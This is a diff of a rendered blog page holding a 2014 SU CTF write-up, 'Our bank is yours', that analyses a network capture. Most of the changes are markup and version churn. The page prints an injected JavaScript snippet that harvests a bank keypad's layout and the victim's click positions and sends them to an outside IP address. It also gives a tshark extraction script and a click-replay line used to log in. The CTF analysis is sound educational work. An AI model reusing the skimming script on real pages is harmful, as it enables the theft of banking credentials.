@@ -24,9 +24,9 @@
     <meta property="og:image" content="https://mjafar.me/assets/images/mj.jpg">
     <meta property="og:type" content="profile">
 
-    <!-- Begin Jekyll SEO tag v2.5.0 -->
+    <!-- Begin Jekyll SEO tag v2.8.0 -->
 <title>SU CTF 2014 – Our bank is yours write up | Mohammad Jafar Mashhadi</title>
-<meta name="generator" content="Jekyll v3.7.4" />
+<meta name="generator" content="Jekyll v3.10.0" />
 <meta property="og:title" content="SU CTF 2014 – Our bank is yours write up" />
 <meta name="author" content="mashhadimj" />
 <meta property="og:locale" content="en_US" />
@@ -38,10 +38,11 @@
 <meta property="og:type" content="article" />
 <meta property="article:published_time" content="2014-09-28T20:54:36+00:00" />
 <meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="SU CTF 2014 – Our bank is yours write up" />
 <meta name="twitter:site" content="@" />
 <meta name="twitter:creator" content="@mashhadimj" />
 <script type="application/ld+json">
-{"url":"https://mjafar.me/blog/2014/09/our-bank-is-yours-write-up/","datePublished":"2014-09-28T20:54:36+00:00","description":"The police have arrested a cyber criminal but they don’t have a good witness. Just a short capture of his network traffic is available. Is it helpful?","@type":"BlogPosting","dateModified":"2014-09-28T20:54:36+00:00","mainEntityOfPage":{"@type":"WebPage","@id":"https://mjafar.me/blog/2014/09/our-bank-is-yours-write-up/"},"author":{"@type":"Person","name":"mashhadimj"},"headline":"SU CTF 2014 – Our bank is yours write up","@context":"http://schema.org"}</script>
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"mashhadimj"},"dateModified":"2014-09-28T20:54:36+00:00","datePublished":"2014-09-28T20:54:36+00:00","description":"The police have arrested a cyber criminal but they don’t have a good witness. Just a short capture of his network traffic is available. Is it helpful?","headline":"SU CTF 2014 – Our bank is yours write up","mainEntityOfPage":{"@type":"WebPage","@id":"https://mjafar.me/blog/2014/09/our-bank-is-yours-write-up/"},"url":"https://mjafar.me/blog/2014/09/our-bank-is-yours-write-up/"}</script>
 <!-- End Jekyll SEO tag -->
 
     
@@ -1519,7 +1520,7 @@ pre {
 
         
             <li class="item">
-                <a class="link" href="https://www.linkedin.com/in/mjafarmashhadi/">Résumé</a>
+                <a class="link" href="https://linkedin.com/in/mjmashhadi">Résumé</a>
             </li>
         
     </ul>
@@ -1551,33 +1552,33 @@ pre {
 
 <p>A pcap network traffic log is attached. By opening it in wireshark you could see that an email is sent with a link to <a href="http://ctf.sharif.edu:45656/" target="_blank"> this page</a> that injects the following javascript code into the page.</p>
 
-<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">setTimeout</span><span class="p">(</span><span class="s2">"sendmap();"</span><span class="p">,</span><span class="mi">1000</span><span class="p">);</span>
-<span class="nb">document</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">addEventListener</span><span class="p">(</span><span class="s2">"click"</span><span class="p">,</span><span class="nx">clickdone</span><span class="p">,</span><span class="kc">false</span><span class="p">);</span>
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">setTimeout</span><span class="p">(</span><span class="dl">"</span><span class="s2">sendmap();</span><span class="dl">"</span><span class="p">,</span><span class="mi">1000</span><span class="p">);</span>
+<span class="nb">document</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">addEventListener</span><span class="p">(</span><span class="dl">"</span><span class="s2">click</span><span class="dl">"</span><span class="p">,</span><span class="nx">clickdone</span><span class="p">,</span><span class="kc">false</span><span class="p">);</span>
 <span class="kd">function</span> <span class="nx">sendmap</span><span class="p">(){</span>
-  <span class="kd">var</span> <span class="nx">buttons</span><span class="o">=</span><span class="nb">document</span><span class="p">.</span><span class="nx">getElementsByClassName</span><span class="p">(</span><span class="s2">"keypadButtonStyle"</span><span class="p">);</span>
-  <span class="kd">var</span> <span class="nx">keymap</span><span class="o">=</span><span class="s2">""</span><span class="p">;</span>
+  <span class="kd">var</span> <span class="nx">buttons</span><span class="o">=</span><span class="nb">document</span><span class="p">.</span><span class="nx">getElementsByClassName</span><span class="p">(</span><span class="dl">"</span><span class="s2">keypadButtonStyle</span><span class="dl">"</span><span class="p">);</span>
+  <span class="kd">var</span> <span class="nx">keymap</span><span class="o">=</span><span class="dl">""</span><span class="p">;</span>
   <span class="k">for</span><span class="p">(</span><span class="kd">var</span> <span class="nx">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="nx">i</span><span class="o">&lt;</span><span class="nx">buttons</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span><span class="nx">i</span><span class="o">++</span><span class="p">)</span>
     <span class="nx">keymap</span><span class="o">+=</span><span class="nx">buttons</span><span class="p">[</span><span class="nx">i</span><span class="p">].</span><span class="nx">value</span><span class="p">;</span>
   <span class="kd">var</span> <span class="nx">xmlhttp</span><span class="o">=</span><span class="k">new</span> <span class="nx">XMLHttpRequest</span><span class="p">();</span>
-  <span class="nx">xmlhttp</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="s2">"GET"</span><span class="p">,</span><span class="s2">"http://95.211.102.232:8080/c.php?t=m&amp;v="</span><span class="o">+</span><span class="nx">keymap</span><span class="p">,</span><span class="kc">false</span><span class="p">);</span>
+  <span class="nx">xmlhttp</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="dl">"</span><span class="s2">GET</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">http://95.211.102.232:8080/c.php?t=m&amp;v=</span><span class="dl">"</span><span class="o">+</span><span class="nx">keymap</span><span class="p">,</span><span class="kc">false</span><span class="p">);</span>
   <span class="nx">xmlhttp</span><span class="p">.</span><span class="nx">send</span><span class="p">();</span>
 <span class="p">}</span>
 <span class="kd">function</span> <span class="nx">clickdone</span><span class="p">(</span><span class="nx">e</span><span class="p">){</span>
   <span class="kd">var</span> <span class="nx">xPosition</span><span class="o">=</span><span class="nx">e</span><span class="p">.</span><span class="nx">clientX</span><span class="p">;</span>
   <span class="kd">var</span> <span class="nx">yPosition</span><span class="o">=</span><span class="nx">e</span><span class="p">.</span><span class="nx">clientY</span><span class="p">;</span>
   <span class="kd">var</span> <span class="nx">xmlhttp</span><span class="o">=</span><span class="k">new</span> <span class="nx">XMLHttpRequest</span><span class="p">();</span>
-  <span class="nx">xmlhttp</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="s2">"GET"</span><span class="p">,</span><span class="s2">"http://95.211.102.232:8080/c.php?t=c&amp;v="</span><span class="o">+</span><span class="nx">xPosition</span><span class="o">+</span><span class="s2">","</span><span class="o">+</span><span class="nx">yPosition</span><span class="p">,</span><span class="kc">false</span><span class="p">);</span>
+  <span class="nx">xmlhttp</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="dl">"</span><span class="s2">GET</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">http://95.211.102.232:8080/c.php?t=c&amp;v=</span><span class="dl">"</span><span class="o">+</span><span class="nx">xPosition</span><span class="o">+</span><span class="dl">"</span><span class="s2">,</span><span class="dl">"</span><span class="o">+</span><span class="nx">yPosition</span><span class="p">,</span><span class="kc">false</span><span class="p">);</span>
   <span class="nx">xmlhttp</span><span class="p">.</span><span class="nx">send</span><span class="p">();</span>
 <span class="p">}</span>
 </code></pre></div></div>
 
-<p>It first sends the mapping of keys to <code class="highlighter-rouge">http://95.211.102.232:8080/c.php</code> then on each click sends the x and y position of click to that page.</p>
+<p>It first sends the mapping of keys to <code class="language-plaintext highlighter-rouge">http://95.211.102.232:8080/c.php</code> then on each click sends the x and y position of click to that page.</p>
 
 <p>We used the following shell script to find all GET requests to the given address.</p>
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/sh</span>
 
-touch bank-followstream.txt
-<span class="nv">END</span><span class="o">=</span><span class="k">$(</span>tshark <span class="nt">-r</span> <span class="nv">$1</span> <span class="nt">-T</span> fields <span class="nt">-e</span> tcp.stream | sort <span class="nt">-n</span> | tail <span class="nt">-1</span><span class="k">)</span>
+<span class="nb">touch </span>bank-followstream.txt
+<span class="nv">END</span><span class="o">=</span><span class="si">$(</span>tshark <span class="nt">-r</span> <span class="nv">$1</span> <span class="nt">-T</span> fields <span class="nt">-e</span> tcp.stream | <span class="nb">sort</span> <span class="nt">-n</span> | <span class="nb">tail</span> <span class="nt">-1</span><span class="si">)</span>
 <span class="k">for</span> <span class="o">((</span><span class="nv">i</span><span class="o">=</span>0<span class="p">;</span>i&lt;<span class="o">=</span>END<span class="p">;</span>i++<span class="o">))</span> <span class="k">do
      </span><span class="nb">echo</span> <span class="nv">$i</span>
      tshark <span class="nt">-r</span> <span class="nv">$1</span> <span class="nt">-qz</span> follow,tcp,ascii,<span class="nv">$i</span> <span class="o">&gt;&gt;</span> bank-followstream.txt
@@ -1585,7 +1586,7 @@ touch bank-followstream.txt
 
 </span><span class="nb">grep</span> <span class="s2">"GET /c.php"</span> &lt; bank-followstream.txt
 </code></pre></div></div>
-<p>Key mapping is <code class="highlighter-rouge">4    1    6    3    7    0    8    9    5    2   Backspace</code>. With a simple javascript code you can simulate clicks on the original page. After logging in the flag will appear.
+<p>Key mapping is <code class="language-plaintext highlighter-rouge">4    1    6    3    7    0    8    9    5    2   Backspace</code>. With a simple javascript code you can simulate clicks on the original page. After logging in the flag will appear.
 This line of javascript (using jQuery) code may be helpful:</p>
 <div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">$</span><span class="p">(</span><span class="nb">document</span><span class="p">.</span><span class="nx">elementFromPoint</span><span class="p">(</span><span class="nx">x</span><span class="p">,</span> <span class="nx">y</span><span class="p">)).</span><span class="nx">click</span><span class="p">();</span>
 </code></pre></div></div>
@@ -1633,7 +1634,7 @@ This line of javascript (using jQuery) code may be helpful:</p>
 
 
 <footer class="footer-main">
-    Mohammad Jafar Mashhadi © 2021
+    Mohammad Jafar Mashhadi © 2025
 
     <p class="extra">
         <a class="link" href="https://github.com/sergiokopplin/indigo">Indigo theme</a> by <a class="link" href="https://github.com/sergiokopplin/indigo">Kopplin</a>
